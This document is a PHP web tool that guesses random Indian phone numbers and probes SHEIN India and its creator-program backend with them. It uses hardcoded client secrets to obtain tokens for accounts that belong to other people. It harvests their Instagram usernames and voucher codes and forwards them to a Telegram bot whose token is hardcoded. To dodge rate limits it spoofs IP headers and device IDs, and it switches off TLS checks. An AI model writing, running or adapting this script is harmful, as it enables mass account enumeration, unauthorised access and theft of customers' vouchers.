<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set execution time limit for serverless
set_time_limit(60);

// Get POST data
$input = json_decode(file_get_contents('php://input'), true);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $input) {
    // Run the checker
    $result = runChecker($input);
    header('Content-Type: application/json');
    echo json_encode($result);
    exit;
}

// Serve the HTML interface for GET requests
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (isset($_GET['download'])) {
        handleDownload($_GET['type'] ?? 'vouchers');
        exit;
    }
    readfile(__DIR__ . '/../public/index.html');
    exit;
}

function runChecker($config) {
    // Override Telegram config with user input
    define('TELEGRAM_BOT_TOKEN', $config['bot_token'] ?? '8479991961:AAEWken8DazbjTaiN_DAGwTuY3Gq0-tb1Hc');
    define('TELEGRAM_CHAT_ID', $config['chat_id'] ?? '1366899854');
    
    $baseNumber = $config['base_number'] ?? '';
    $numChecks = min(intval($config['num_checks'] ?? 50), 200); // Limit to 200 checks
    
    // Temporary storage in /tmp for Vercel
    $tempDir = '/tmp/shein_checker_' . uniqid();
    if (!file_exists($tempDir)) {
        mkdir($tempDir, 0777, true);
    }
    
    // Override file paths to use temp directory
    global $checkedNumbersFile, $registeredNumbersFile, $voucherNumbersFile, $allResultsFile, $retryQueue;
    $checkedNumbersFile = $tempDir . '/checked_numbers.json';
    $registeredNumbersFile = $tempDir . '/registered_numbers.txt';
    $voucherNumbersFile = $tempDir . '/voucher_numbers.txt';
    $allResultsFile = $tempDir . '/all_results.json';
    $retryQueueFile = $tempDir . '/retry_queue.json';
    
    // Global tracking to prevent duplicate numbers
    $checkedNumbers = [];
    $retryQueue = [];
    
    // Retry configuration
    define('MAX_RETRIES', 3);
    define('RETRY_DELAY', 1000000);
    
    // ANSI color codes (disabled for web output)
    define('COLOR_RESET', '');
    define('COLOR_RED', '');
    define('COLOR_GREEN', '');
    define('COLOR_YELLOW', '');
    define('COLOR_BLUE', '');
    define('COLOR_MAGENTA', '');
    define('COLOR_CYAN', '');
    define('COLOR_WHITE', '');
    define('COLOR_BOLD', '');
    define('COLOR_CLEAR_LINE', '');
    define('COLOR_SAVE_CURSOR', '');
    define('COLOR_RESTORE_CURSOR', '');
    define('CARRIAGE_RETURN', '');
    
    // Load previously checked numbers
    function loadCheckedNumbers() {
        global $checkedNumbers, $checkedNumbersFile;
        if (file_exists($checkedNumbersFile)) {
            $checkedNumbers = json_decode(file_get_contents($checkedNumbersFile), true) ?: [];
        }
    }
    
    // Save checked number
    function saveCheckedNumber($number) {
        global $checkedNumbers, $checkedNumbersFile;
        $checkedNumbers[$number] = time();
        file_put_contents($checkedNumbersFile, json_encode($checkedNumbers, JSON_PRETTY_PRINT));
    }
    
    // Save registered number
    function saveRegisteredNumber($number, $username = 'N/A', $encryptedId = 'N/A') {
        global $registeredNumbersFile;
        
        $timestamp = date('Y-m-d H:i:s');
        $entry = "[$timestamp] Number: $number | Instagram: $username | EncryptedID: $encryptedId\n";
        
        file_put_contents($registeredNumbersFile, $entry, FILE_APPEND | LOCK_EX);
        
        $jsonFile = dirname($registeredNumbersFile) . '/registered_numbers.json';
        $registered = [];
        if (file_exists($jsonFile)) {
            $registered = json_decode(file_get_contents($jsonFile), true) ?: [];
        }
        $registered[$number] = [
            'number' => $number,
            'username' => $username,
            'encryptedId' => $encryptedId,
            'timestamp' => $timestamp
        ];
        file_put_contents($jsonFile, json_encode($registered, JSON_PRETTY_PRINT));
    }
    
    // Save voucher number
    function saveVoucherNumber($number, $voucherData) {
        global $voucherNumbersFile, $allResultsFile;
        
        $timestamp = date('Y-m-d H:i:s');
        
        $entry = "[$timestamp] Number: $number | Instagram: {$voucherData['username']} | Voucher: {$voucherData['voucher']} | Amount: ₹{$voucherData['amount']} | Expiry: {$voucherData['expiry']} | Min Purchase: ₹{$voucherData['min_purchase']}\n";
        file_put_contents($voucherNumbersFile, $entry, FILE_APPEND | LOCK_EX);
        
        $jsonFile = dirname($voucherNumbersFile) . '/voucher_numbers.json';
        $vouchers = [];
        if (file_exists($jsonFile)) {
            $vouchers = json_decode(file_get_contents($jsonFile), true) ?: [];
        }
        $vouchers[$number] = array_merge(
            ['timestamp' => $timestamp, 'number' => $number],
            $voucherData
        );
        file_put_contents($jsonFile, json_encode($vouchers, JSON_PRETTY_PRINT));
        
        $allResults = [];
        if (file_exists($allResultsFile)) {
            $allResults = json_decode(file_get_contents($allResultsFile), true) ?: [];
        }
        $allResults[] = array_merge(
            ['timestamp' => $timestamp, 'number' => $number, 'type' => 'voucher'],
            $voucherData
        );
        file_put_contents($allResultsFile, json_encode($allResults, JSON_PRETTY_PRINT));
    }
    
    // Save to retry queue
    function saveToRetryQueue($number, $step, $headers, $retryCount = 0, $encryptedId = null, $errorReason = '') {
        global $retryQueue, $retryQueueFile;
        
        $retryQueue[] = [
            'number' => $number,
            'step' => $step,
            'headers' => $headers,
            'retryCount' => $retryCount + 1,
            'lastAttempt' => time(),
            'encryptedId' => $encryptedId,
            'errorReason' => $errorReason
        ];
        
        file_put_contents($retryQueueFile, json_encode($retryQueue, JSON_PRETTY_PRINT));
    }
    
    // Load retry queue
    function loadRetryQueue() {
        global $retryQueue, $retryQueueFile;
        if (file_exists($retryQueueFile)) {
            $retryQueue = json_decode(file_get_contents($retryQueueFile), true) ?: [];
        }
    }
    
    // Export to CSV
    function exportToCSV() {
        global $tempDir;
        $csvFile = $tempDir . '/voucher_results_' . date('Y-m-d') . '.csv';
        $jsonFile = $tempDir . '/voucher_numbers.json';
        
        if (file_exists($jsonFile)) {
            $vouchers = json_decode(file_get_contents($jsonFile), true) ?: [];
            
            $fp = fopen($csvFile, 'w');
            fputcsv($fp, ['Timestamp', 'Phone Number', 'Instagram Username', 'Voucher Code', 'Amount', 'Min Purchase', 'Expiry Date']);
            
            foreach ($vouchers as $voucher) {
                fputcsv($fp, [
                    $voucher['timestamp'],
                    $voucher['number'],
                    $voucher['username'],
                    $voucher['voucher'],
                    $voucher['amount'],
                    $voucher['min_purchase'],
                    $voucher['expiry']
                ]);
            }
            fclose($fp);
            return $csvFile;
        }
        return false;
    }
    
    // Send message to Telegram
    function sendTelegramMessage($message) {
        if (TELEGRAM_BOT_TOKEN == 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID == 'YOUR_CHAT_ID') {
            return false;
        }
        
        $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
        $data = [
            'chat_id' => TELEGRAM_CHAT_ID,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_TIMEOUT => 10
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
    
    // Generate complete phone number
    function generateCompleteNumber($input) {
        $input = preg_replace('/[^0-9]/', '', $input);
        $inputLength = strlen($input);
        
        if ($inputLength >= 10) {
            return $input;
        }
        
        $digitsNeeded = 10 - $inputLength;
        $randomDigits = '';
        for ($i = 0; $i < $digitsNeeded; $i++) {
            $randomDigits .= rand(0, 9);
        }
        
        return $input . $randomDigits;
    }
    
    function httpCall($url, $data = null, $headers = [], $method = "GET", $returnHeaders = false) {
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => $returnHeaders,
            CURLOPT_ENCODING => 'gzip',
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 15
        ]);
        
        if (strtoupper($method) === "POST") {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
        
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlError = curl_error($ch);
        curl_close($ch);
        
        return [
            'content' => $output, 
            'http_code' => $httpCode,
            'curl_error' => $curlError
        ];
    }
    
    function randIp() { 
        return rand(100,200) . "." . rand(10,250) . "." . rand(10,250) . "." . rand(1,250); 
    }
    
    function genDeviceId() { 
        return bin2hex(random_bytes(8)); 
    }
    
    // Check if response is a real error that needs retry
    function isRealError($response) {
        if (!empty($response['curl_error'])) {
            return true;
        }
        
        if (empty($response['content'])) {
            return true;
        }
        
        $httpCode = $response['http_code'];
        
        if ($httpCode >= 500 && $httpCode < 600) {
            return true;
        }
        
        if ($httpCode == 429 || $httpCode == 408 || $httpCode == 502 || $httpCode == 503 || $httpCode == 504) {
            return true;
        }
        
        if (!empty($response['content'])) {
            json_decode($response['content']);
            if (json_last_error() !== JSON_ERROR_NONE) {
                return true;
            }
        }
        
        return false;
    }
    
    // Simplified Stats Manager for web
    class WebStatsManager {
        public $stats = [
            'total_processed' => 0,
            'not_registered' => 0,
            'registered' => 0,
            'vouchers' => 0,
            'errors' => 0,
            'retries' => 0,
            'vouchers_found' => []
        ];
        
        public function updateStats($status, $voucherData = null) {
            $this->stats['total_processed']++;
            
            if ($status == 'success') {
                $this->stats['vouchers']++;
                if ($voucherData) {
                    $this->stats['vouchers_found'][] = $voucherData;
                }
            } elseif ($status == 'not_registered') {
                $this->stats['not_registered']++;
            } elseif ($status == 'registered' || $status == 'token_obtained') {
                $this->stats['registered']++;
            } elseif ($status == 'retry') {
                $this->stats['retries']++;
            } else {
                $this->stats['errors']++;
            }
        }
        
        public function getStats() {
            return $this->stats;
        }
    }
    
    // Simplified Response Handler for web
    class WebResponseHandler {
        private $statsManager;
        private $access_token;
        
        public function __construct($statsManager, $access_token) {
            $this->statsManager = $statsManager;
            $this->access_token = $access_token;
        }
        
        public function checkNumber($number) {
            $ip = randIp();
            $adId = genDeviceId();
            
            // Account check
            $url = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
            $headers = [
                "Authorization: Bearer " . $this->access_token,
                "Requestid: account_check",
                "X-Tenant: B2C",
                "Accept: application/json",
                "User-Agent: Android",
                "Client_type: Android/29",
                "Client_version: 1.0.8",
                "X-Tenant-Id: SHEIN",
                "Ad_id: $adId",
                "Content-Type: application/x-www-form-urlencoded",
                "X-Forwarded-For: $ip"
            ];
            
            $response = httpCall($url, "mobileNumber=$number", $headers, "POST");
            
            if (isRealError($response)) {
                $this->statsManager->updateStats('error');
                saveCheckedNumber($number);
                return;
            }
            
            $j = json_decode($response['content'], true);
            
            if (isset($j['success']) && $j['success'] === false) {
                $this->statsManager->updateStats('not_registered');
                saveCheckedNumber($number);
            } elseif (isset($j['encryptedId'])) {
                $this->statsManager->updateStats('registered');
                saveRegisteredNumber($number, 'N/A', $j['encryptedId']);
                $this->continueProcessing($number, $j['encryptedId']);
            }
        }
        
        private function continueProcessing($number, $encryptedId) {
            $ip = randIp();
            $adId = genDeviceId();
            
            $payload = json_encode([
                "client_type" => "Android/29",
                "client_version" => "1.0.8",
                "gender" => "",
                "phone_number" => $number,
                "secret_key" => "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
                "user_id" => $encryptedId,
                "user_name" => ""
            ]);
            
            $headers = [
                "Accept: application/json",
                "User-Agent: Android",
                "Client_type: Android/29",
                "Client_version: 1.0.8",
                "X-Tenant-Id: SHEIN",
                "Ad_id: $adId",
                "Content-Type: application/json; charset=UTF-8",
                "X-Forwarded-For: $ip"
            ];
            
            $response = httpCall("https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token", $payload, $headers, "POST");
            
            if (isRealError($response)) {
                $this->statsManager->updateStats('error');
                saveCheckedNumber($number);
                return;
            }
            
            $j = json_decode($response['content'], true);
            
            if (!empty($j['access_token'])) {
                $sheinverse_token = $j['access_token'];
                $this->statsManager->updateStats('registered');
                $this->getUserData($number, $sheinverse_token);
            } else {
                $this->statsManager->updateStats('error');
                saveCheckedNumber($number);
            }
        }
        
        private function getUserData($number, $sheinverse_token) {
            $ip = randIp();
            $adId = genDeviceId();
            
            $headers = [
                "Host: shein-creator-backend-151437891745.asia-south1.run.app",
                "Authorization: Bearer " . $sheinverse_token,
                "User-Agent: Mozilla/5.0 (Linux; Android 15; SM-S938B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36",
                "Accept: */*",
                "Origin: https://sheinverse.galleri5.com",
                "X-Requested-With: com.ril.shein",
                "Referer: https://sheinverse.galleri5.com/",
                "Content-Type: application/json",
                "X-Forwarded-For: $ip"
            ];
            
            $response = httpCall("https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user", null, $headers, "GET");
            
            if (isRealError($response)) {
                $this->statsManager->updateStats('error');
                saveCheckedNumber($number);
                return;
            }
            
            $decoded = json_decode($response['content'], true);
            
            if (isset($decoded['user_data']['instagram_data']['username'])) {
                $username = $decoded['user_data']['instagram_data']['username'];
                $voucher = $decoded['user_data']['voucher_data']['voucher_code'] ?? 'N/A';
                $voucher_amount = $decoded['user_data']['voucher_data']['voucher_amount'] ?? 'N/A';
                $expiry_date = $decoded['user_data']['voucher_data']['expiry_date'] ?? '';
                $min_purchase_amount = $decoded['user_data']['voucher_data']['min_purchase_amount'] ?? '';
                
                saveCheckedNumber($number);
                
                $voucherData = [
                    'time' => time(),
                    'number' => $number,
                    'username' => $username,
                    'voucher' => $voucher,
                    'amount' => $voucher_amount,
                    'min_purchase' => $min_purchase_amount,
                    'expiry' => $expiry_date
                ];
                
                saveVoucherNumber($number, $voucherData);
                $this->statsManager->updateStats('success', $voucherData);
                
                // Only send Telegram for specific prefixes
                if (TELEGRAM_BOT_TOKEN != 'YOUR_BOT_TOKEN' && $voucher != 'N/A') {
                    $allowedPrefixes = ['SVH', 'SVD', 'SVI', 'SVC'];
                    $voucherPrefix = strtoupper(substr($voucher, 0, 3));
                    
                    if (in_array($voucherPrefix, $allowedPrefixes)) {
                        $telegramMsg = "<b>✅ SHEIN Voucher Found!</b>\n\n";
                        $telegramMsg .= "📞 <b>Number:</b> {$number}\n";
                        $telegramMsg .= "📸 <b>Instagram:</b> {$username}\n";
                        $telegramMsg .= "🎟 <b>Voucher Code:</b> <code>{$voucher}</code>\n";
                        $telegramMsg .= "💰 <b>Amount:</b> ₹{$voucher_amount}\n";
                        $telegramMsg .= "🛍 <b>Min Purchase:</b> ₹{$min_purchase_amount}\n";
                        $telegramMsg .= "⏰ <b>Expiry:</b> {$expiry_date}";
                        sendTelegramMessage($telegramMsg);
                    }
                }
            } else {
                $this->statsManager->updateStats('error');
                saveCheckedNumber($number);
            }
        }
    }
    
    // Main execution
    loadCheckedNumbers();
    
    // Get access token first
    $ip = randIp();
    $adId = genDeviceId();
    $url = "https://api.services.sheinindia.in/uaas/jwt/token/client";
    $headers = [
        "Client_type: Android/29",
        "Accept: application/json",
        "Client_version: 1.0.8",
        "User-Agent: Android",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "X-Tenant: B2C",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $ip"
    ];
    
    $data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
    $response = httpCall($url, $data, $headers, "POST", 0);
    $j = json_decode($response['content'], true);
    $access_token = $j['access_token'] ?? null;
    
    if (!$access_token) {
        return ['error' => 'Failed to obtain access token'];
    }
    
    $statsManager = new WebStatsManager();
    $responseHandler = new WebResponseHandler($statsManager, $access_token);
    
    $processed = 0;
    $startTime = time();
    
    // Main processing loop
    while ($processed < $numChecks && (time() - $startTime) < 55) { // 55 second timeout
        // Generate new unique number
        $attempts = 0;
        $maxAttempts = 100;
        
        do {
            $completeNumber = generateCompleteNumber($baseNumber);
            $attempts++;
            if ($attempts > $maxAttempts) {
                break 2;
            }
        } while (isset($checkedNumbers[$completeNumber]));
        
        $responseHandler->checkNumber($completeNumber);
        $processed++;
        
        // Small delay to avoid rate limiting
        usleep(200000);
    }
    
    // Prepare results
    $stats = $statsManager->getStats();
    
    // Create download URL
    $downloadUrl = '/?download=1&dir=' . basename($tempDir);
    
    return array_merge($stats, [
        'download_url' => $downloadUrl,
        'message' => 'Checking completed successfully'
    ]);
}

function handleDownload($type) {
    $dir = $_GET['dir'] ?? '';
    if (!$dir) {
        http_response_code(404);
        echo 'File not found';
        return;
    }
    
    $tempDir = '/tmp/shein_checker_' . $dir;
    
    if ($type === 'vouchers') {
        $file = $tempDir . '/voucher_numbers.json';
        $filename = 'vouchers.json';
    } else {
        $file = $tempDir . '/all_results.json';
        $filename = 'all_results.json';
    }
    
    if (file_exists($file)) {
        header('Content-Type: application/json');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        readfile($file);
    } else {
        http_response_code(404);
        echo 'File not found';
    }
}
?>